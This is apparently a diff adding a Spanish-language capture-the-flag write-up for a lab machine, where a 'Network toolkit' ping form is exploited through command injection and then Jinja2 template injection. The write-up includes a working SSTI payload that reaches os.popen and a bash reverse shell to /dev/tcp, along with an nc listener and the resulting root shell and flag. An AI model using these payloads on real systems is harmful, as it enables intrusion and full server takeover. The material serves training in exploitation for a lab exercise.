@@ -303,4 +303,258 @@ tcp   LISTEN  0  151   127.0.0.1:3306       0.0.0.0:*
 
 ```
 
+la entrada de la IP no está sanitizada, y damos con ello en el siguiente ejemplo
+
+```shell
+steve@reto02:~$ curl "http://127.0.0.1:7080/?ip=8.8.8.8`whoami`" | tail -n 20
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2625  100  2625    0     0  45618      0 --:--:-- --:--:-- --:--:-- 46052
+        <h1>Ejecutar diagnóstico ICMP</h1>
+            <form method="GET" action="/" style="margin: 20px; padding: 20px; border: 1px solid #ccc; border-radius: 8px; background-color: #f9f9f9; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); display: flex; flex-direction: column; width: 100%; max-width: 600px;">
+            <label for="ip">
+                Dirección IP:
+            </label>
+            <input type="text" id="ip" name="ip" value="8.8.8.8steve" required>
+            <button id="submitButton" type="submit" onclick="this.disabled=true; this.form.submit();">
+                Ejecutar
+            </button>
+        </form>
+
+        
+        <pre>
+                Error al ejecutar: /usr/bin/ping: 8.8.8.8steve: Name or service not known
+
+        </pre>
+        
+    </body>
+    </html>
+
+```
+SSTI
+
+
+```shell
+steve@reto02:~$ curl "http://127.0.0.1:7080/?ip=%7B%7B7*7%7D%7D"
+
+    <!doctype html>
+    <html>
+    <head>
+        <title>Network toolkit</title>
+        <style>
+            #submitButton {
+                padding: 10px 15px; 
+                border: none; 
+                border-radius: 4px; 
+                background-color: rgb(255, 99, 71); /* Color rojo tomate */
+                color: white; 
+                cursor: pointer; 
+                transition: background-color 0.3s;
+            }
+
+            #submitButton:disabled {
+                background-color: gray; 
+                color: rgba(255, 255, 255, 0.5);
+                cursor: not-allowed;
+            }
+
+            /* Estilos del formulario */
+            form {
+                margin: 20px; 
+                padding: 20px; 
+                border: 1px solid #ccc; 
+                border-radius: 8px; 
+                background-color: #f9f9f9; 
+                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); 
+                display: flex; 
+                flex-direction: column; 
+                width: 100%; 
+                max-width: 600px;
+            }
+
+            /* Estilos del input */
+            input[type="text"] {
+                padding: 8px; 
+                border: 1px solid #ccc; 
+                border-radius: 4px; 
+                width: 100%; 
+                margin-bottom: 10px;
+            }
+
+            /* Estilos del bloque pre */
+            pre {
+                background-color: #f5f5f5; 
+                border: 1px solid #ccc; 
+                border-radius: 4px; 
+                padding: 10px; 
+                overflow: auto; 
+                white-space: pre-wrap; 
+                word-wrap: break-word; 
+                margin-top: 20px; 
+                font-family: monospace; 
+                font-size: 14px;
+            }
+        </style>
+    </head>
+    <body>
+        <h1>Ejecutar diagnóstico ICMP</h1>
+            <form method="GET" action="/" style="margin: 20px; padding: 20px; border: 1px solid #ccc; border-radius: 8px; background-color: #f9f9f9; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); display: flex; flex-direction: column; width: 100%; max-width: 600px;">
+            <label for="ip">
+                Dirección IP:
+            </label>
+            <input type="text" id="ip" name="ip" value="49" required>
+            <button id="submitButton" type="submit" onclick="this.disabled=true; this.form.submit();">
+                Ejecutar
+            </button>
+        </form>
+
+        
+        <pre>
+                Error al ejecutar: /usr/bin/ping: {{7*7}}: Name or service not known
+
+        </pre>
+        
+    </body>
+    </html>
+    steve@reto02:~$ 
+
+```
+ 
+nos devuelve el valor 49 
+
+
+con el siguiente **payload** observamos que nos da root 
+
+```bash
+steve@reto02:~$ curl "http://127.0.0.1:7080/?ip=%7B%7Bself._TemplateReference__context.cycler.__init__.__globals__.os.popen(%27whoami%27).read()%7D%7D"
+
+    <!doctype html>
+    <html>
+    <head>
+        <title>Network toolkit</title>
+        <style>
+            #submitButton {
+                padding: 10px 15px; 
+                border: none; 
+                border-radius: 4px; 
+                background-color: rgb(255, 99, 71); /* Color rojo tomate */
+                color: white; 
+                cursor: pointer; 
+                transition: background-color 0.3s;
+            }
+
+            #submitButton:disabled {
+                background-color: gray; 
+                color: rgba(255, 255, 255, 0.5);
+                cursor: not-allowed;
+            }
+
+            /* Estilos del formulario */
+            form {
+                margin: 20px; 
+                padding: 20px; 
+                border: 1px solid #ccc; 
+                border-radius: 8px; 
+                background-color: #f9f9f9; 
+                box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); 
+                display: flex; 
+                flex-direction: column; 
+                width: 100%; 
+                max-width: 600px;
+            }
+
+            /* Estilos del input */
+            input[type="text"] {
+                padding: 8px; 
+                border: 1px solid #ccc; 
+                border-radius: 4px; 
+                width: 100%; 
+                margin-bottom: 10px;
+            }
+
+            /* Estilos del bloque pre */
+            pre {
+                background-color: #f5f5f5; 
+                border: 1px solid #ccc; 
+                border-radius: 4px; 
+                padding: 10px; 
+                overflow: auto; 
+                white-space: pre-wrap; 
+                word-wrap: break-word; 
+                margin-top: 20px; 
+                font-family: monospace; 
+                font-size: 14px;
+            }
+        </style>
+    </head>
+    <body>
+        <h1>Ejecutar diagnóstico ICMP</h1>
+            <form method="GET" action="/" style="margin: 20px; padding: 20px; border: 1px solid #ccc; border-radius: 8px; background-color: #f9f9f9; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); display: flex; flex-direction: column; width: 100%; max-width: 600px;">
+            <label for="ip">
+                Dirección IP:
+            </label>
+            <input type="text" id="ip" name="ip" value="root
+" required>
+            <button id="submitButton" type="submit" onclick="this.disabled=true; this.form.submit();">
+                Ejecutar
+            </button>
+        </form>
+
+        
+        <pre>
+                Error al ejecutar: /usr/bin/ping: {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen(&#39;whoami&#39;).read()}}: Name or service not known
+
+        </pre>
+        
+    </body>
+    </html>
+    steve@reto02:~$ 
+
+```
+
+nos ponemos a escuchar por el puerto 4444 con el comando `nc -lvnp 44444` y con el siguiente **payload** 
+
+```shell
+curl "http://127.0.0.1:7080/?ip=%7B%7Bself._TemplateReference__context.cycler.__init__.__globals__.os.popen(%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.0.2.15/4444%200%3E%261%22%27).read()%7D%7D"
+
+```
+
+>[!NOTE]
+> **Payload** sin el URL encoding: `{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/TU_IP/9001 0>&1"').read()}}`
+> `{{}}` es una expresión Jinja2 (SSTI)
+> `self._TemplateReference__context.cycler.__init__.__globals__.os.popen('comando')` nos permite acceder a `os.popen()`, el cual ejecuta comando en el sistema
+> y el resto es la shell que redirigimos a nuestra máquina.
+
+
+y ahora somos root
+
+```shell
+listening on [any] 4444 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.12] 47226
+bash: cannot set terminal process group (32420): Inappropriate ioctl for device
+bash: no job control in this shell
+root@reto02:/# 
+
+```
+vamos al directorio `/root` y ejecutamos el mismo comando que en la flag 2 para sacar esta
+
+```shell
+root@reto02:/etc# cd /root
+cd /root
+root@reto02:~# ls
+ls
+root.txt.gpg
+root@reto02:~# echo "spongebob" | gpg --batch --yes --passphrase-fd 0 --decrypt root.txt.gpg
+<atch --yes --passphrase-fd 0 --decrypt root.txt.gpg
+gpg: failed to create temporary file '/root/.gnupg/.#lk0x00006016844ecc40.reto02.hackaton.44588': Not a directory
+gpg: keyblock resource '/root/.gnupg/pubring.kbx': Not a directory
+gpg: AES256.CFB encrypted data
+gpg: encrypted with 1 passphrase
+HACK{BJ5gnYgLgTJRJDPsMEF2QC8SQ}
+
+```
+
+Y tenemos la flag 3: `HACK{BJ5gnYgLgTJRJDPsMEF2QC8SQ}`
+
+
 
